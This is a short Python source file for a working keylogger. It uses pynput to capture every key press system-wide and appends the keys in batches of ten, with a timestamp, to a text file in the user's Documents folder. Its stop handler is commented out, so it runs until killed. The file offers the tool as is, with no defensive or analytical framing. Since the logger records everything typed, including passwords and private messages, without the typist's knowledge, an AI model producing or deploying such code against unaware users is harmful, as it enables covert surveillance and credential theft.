from pynput import keyboard as KEYBOARD
from datetime import datetime as DATE
from os import path as FILE_PATH
keys = []
count = 0

# Modified for key logger output file's location
PATH = "~/Documents/key.txt"
full_path = FILE_PATH.expanduser(PATH)


def write():
    with open(full_path, "a") as f:
        for i in keys:
            key = str(i)
            # BackSpace
            if key.find('backspace') > 0:
                f.write(' [\'BSp\']\n')
            # Space
            elif key.find('space') > 0:
                f.write(' [\'Sp\']\n')
            # Enter
            elif key.find('enter') > 0:
                f.write(' [\'En\']\n')

            elif key.find('Key') == -1:
                f.write(key.replace("'", ""))


def evnt_key_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count == 10:
        write()
        count = 0
        keys.clear()


# def stop_evnt(key):
#     if key == KEYBOARD.Key.ESC:
#         write()
#         return False


if __name__ == '__main__':
    if FILE_PATH.exists(full_path) == False:
        f = open(full_path, "w")
        f.close()
    with open(full_path, "a") as f:
        f.write("{0}\n".format(DATE.now()))
    with KEYBOARD.Listener(on_press=evnt_key_press) as listener:
        listener.join()
